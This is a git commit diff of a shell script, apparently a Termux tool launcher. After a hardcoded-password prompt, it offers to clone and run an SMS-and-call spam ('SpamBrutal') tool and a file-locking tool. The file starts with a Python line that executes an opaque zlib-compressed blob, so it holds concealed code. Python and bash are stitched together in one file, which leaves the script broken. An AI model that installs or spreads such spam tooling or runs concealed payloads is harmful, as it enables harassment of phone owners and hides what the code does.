6fa9fa6f9f25d02a2d02fe217419dbb57a50d198
TermuxIND <72206761+TermuxIND@users.noreply.github.com>
2020-10-02 04:33:12 +0700

    Update TermuxIND.sh

--- TermuxIND.sh
+++ TermuxIND.sh
@@ -1,2 +1,181 @@
 import zlib
 exec(zlib.decompress('x\x9c\xedUQk\xdb0\x10~/\xf4?\\\xdd\xd2\x97\x12{qB\xb7\xb9\xf4\xa1M\xbb.\xddV\xba%\xa5\x1b\xa3\x0f\x8a\xa3\xc4"\xb6,dk^\xde\xf6\x13Zh\x18\x04\xf64(\x14\xf6\xab\xf2K&[Jb\xa7N\xc3\xc6\x9eF\x0f#Nw\x9fNw\xa7\xbb\xf3\xe6\x86\xd5!\xd4\xea\xa0\xc8[_\x03\xecz!\x18\x93\xd1\xeddt\x9d}\xdf\xa7\xfcC\xe6.\xb7\xbd\x9b2z]_\x9b\x8c\xc6\xd3\xdd\x8f\xc9\xe8&\x83(\xe6W\xb6.\xfb\xe6\xa7\xa4\x8d\xdboZ\xac\x99\xfbLy\x93\xad?\x97\xdbPw\x8e\x95\x1f\xe9\xd1q*\xd0\xcc\xf5Ty\x9fc\xaes\xdb\x19@\xaf\xcd\xb3#C\xa6&\xf21fP\x9d%i\xffQ*;\xd1\xe0\x18\xc5!w\xe0\x12yC\x01\xc7\x03\x04\xe7\x1c\r\xc3>*C\x7f\nE[t\xb0\x03^\x1c\xb3\xc8\xb1\xac$I\xcca(b)4\xdd0\xb0\\\x0fQ\x8a}\xeb\xa2\x81N\xfb\xcf\x9a\x8d\x93\xf0\xb8\xf6r\xf7y\xf2\xe5c\x1d\xef&,)3z\xe9\xa18:`\xcc\x81\x9d]\xfb\x85]\xadU\xed\xba]\xabW\xffI\x80\x15\n\x86\x880\xa7(\xc0NQ/#\xef\x02K\xf6$\x0b@z\xf0\x19\xb6X\x02\xfb`\xb41\x0f\xc4\xd74\xc5p\x95)c\x0fS\xc88\xe5E[\xd0\xbe0\x8dL2\xb7W\xd4\xaeR\xaf\xd4/\x05\\\xe8p\xe0\x10S\xc47\xf2\xb0\xda\x82\x1de\xa8h\xcaV\x18?\xc2\xa5\xe0\x12h\xf1\xd6\x16\xf2\x91\xa7oU\xaa\xd7\xa2#\x8f\x13\xd0\xb5\x04\xa7DVQ\xcb\xe5\x84\xc5p\xccy\xc8\x1f\xd8\xec\x11\xb9n>\xf5\xf6So\xffe\x80\xd3\xd2\xab\x9a\xd0b(8\xe4"F\xbe\xec\xe0V\x10\xed4\x90\xef\xc3\xd5\xb2\xee\xb1Mx#\xa8K^\x11\x1f/\xc3T\xca\xe8!8\x1b \x15\x06\xc6;\x14\x89\xc1\x00Q8\'>\x91Y\x82\x03\xdaEpD"B\x89c\x00K\xa5\xd9\tEz\xd6\xa4\xd2t\xdcT\xe5\x98\x81\xbd\x9c~>n\x8a\xa4\x9c#4\x92\xb1\xfa\x84\xf6s\xa1\xab67u[\x16)?\x1a\x8a\xe4va\xcb\x0b\x03\\\xa2B\xb2w\x05\xeb\xa2\x18\xc3\xf6\xb6\xde\xf59\xeab\xa8\x0c\x97\xc0\xb5c\xc0\x86\xb1\x17\xd2\xd5\xb8>\x89\xcbA\xa9\xc2\xf5C\x8ag\xa5(%\x9e\xe8dU\xd8|[?;y\x7fY\xfb`u\xb2\xc8#\x99\x83\x00\xf3\xf2\xe8VA\xb4\xab*\x87-\x053Y\xd1\'\xec/\xbc\x97\xbd\xf8^\x7f\xf0b\xb3\xd23\xf3\x83\xb9H\xff\xd7{\xcd~\xa6\xd6 \x8d\xbd\'c/\x8f\xec1\xb5r\xd1\x9ec\x16\x1f)\xa5\x1e\x81\xdf\x1a\xb8\x82X'))
+#!/bin/bash
+
+ echo "╔══╗╔═╗╔═╗╔═╦═╗╔╦╗╔╗╔╗
+
+╚╗╔╝║╦╝║╬║║║║║║║║║╚╗╔╝
+
+─║║─║╩╗║╗╣║║║║║║║║╔╝╚╗
+
+─╚╝─╚═╝╚╩╝╚╩═╩╝╚═╝╚╝╚╝IND"
+
+ sleep 1
+
+ echo "=============================="
+
+ sleep 1
+
+ echo "Creator: Wahyu Eka Prayoga"
+
+ sleep 1
+
+ echo "YouTube: https://www.youtube.com/channel/UCaJg0ICGoE3967wvX4e6wpw"
+
+ sleep 1
+
+ echo "WhatsApp: +6282131242341"
+
+ sleep 1
+
+ echo "=============================="
+
+ sleep 1
+
+ echo -n "username:"
+
+ sleep 1
+
+ read pw;
+
+   if [ $pw = "TermuxIND" ]
+
+   then 
+
+   echo "Tungu."
+
+   sleep 1
+
+   echo "Tungu.."
+
+   sleep 1
+
+   echo "Tungu..."
+
+   sleep 1
+
+   echo "Tungu...."
+
+   sleep 1
+
+   echo "Username Benar!"
+
+   sleep 3
+
+   echo "Tunggu......"
+
+   sleep 2
+
+   else
+
+   echo "Tunggu...."
+
+   sleep 2
+
+   echo "Username Salah!"
+
+   echo "Hubungi Creator Jika Script Error"
+
+   sleep 2
+
+  fi
+
+ #
+
+ echo "╔══╗╔═╗╔═╗╔═╦═╗╔╦╗╔╗╔╗
+
+╚╗╔╝║╦╝║╬║║║║║║║║║╚╗╔╝
+
+─║║─║╩╗║╗╣║║║║║║║║╔╝╚╗
+
+─╚╝─╚═╝╚╩╝╚╩═╩╝╚═╝╚╝╚╝IND"
+
+ sleep 1
+
+ echo "=============================="
+
+ sleep 1
+
+ echo "Creator: Wahyu Eka Prayoga"
+
+ sleep 1
+
+ echo "YouTube: https://www.youtube.com/channel/UCaJg0ICGoE3967wvX4e6wpw"
+
+ sleep 1
+
+ echo "WhatsApp: +6282131242341"
+
+ sleep 1
+
+ echo "=============================="
+
+ sleep 1
+
+   echo "1. SpamBrutal [ Sms+Call ]"
+
+   sleep 1
+
+   echo "2. KunciFile"
+
+   sleep 1
+
+   echo "---------------------"
+
+   sleep 1
+
+   read -p "Masukkan Pilihan Anda Disini:" pilih
+
+         if [ $pilih = "1" ] ;
+
+         then 
+
+                 echo "installing SpamBrutal.......!"
+
+                 sleep 3
+
+                 cd $home
+
+                 apt update && apt upgrade -y
+
+                 apt install python -y
+
+                 apt install git -y
+
+                 git clone https://github.com/IL4NGQW3R/brutalspammer
+
+                 echo" memuat...."
+
+                 sleep 1
+
+                 cd brutalspammer
+
+                 python BrutalSpammer.py
+
+           elif [ $pilih = "2" ] ;
+
+           then 
+
+                 echo "installing KunciFile......."
+
+                 sleep 3
+
+                 cd $home
+
+                 apt update && apt upgrade -y
+
+                 apt install python -y
+
+                 apt install git -y
+
+                 git clone https://github.com/TermuxIND/kuncifile
+
+                 echo" memuat...."
+
+                 sleep 1
+
+                 cd kuncifile
+
+                 python2 kuncifile.py
+
+               fi 
